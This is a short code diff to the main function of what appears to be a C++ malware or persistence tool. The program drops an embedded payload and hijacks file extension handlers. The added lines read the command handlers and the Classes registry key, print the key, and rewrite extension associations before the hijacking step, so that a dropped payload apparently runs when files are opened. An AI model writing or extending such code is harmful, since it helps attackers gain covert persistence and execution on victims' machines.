@@ -9,7 +9,12 @@ int main(int argc, char *argv[])
     if (!dropResource(payloadName)) {
         printf("[-] Dropping failed!\n");
     }
-  
+    std::set<std::string> handlersSet = getGlobalCommands();
+
+    std::string classesKey = getLocalClasses();
+    printf("%s\n", classesKey.c_str());
+    rewriteExtensions(classesKey, handlersSet);
+    
     size_t hijacked = hijackExtensions(payloadName);
     if (hijacked == 0) {
         printf("[-] Hijacking failed!\n");
@@ -19,3 +24,4 @@ int main(int argc, char *argv[])
     system("pause");
     return 0;
 }
+
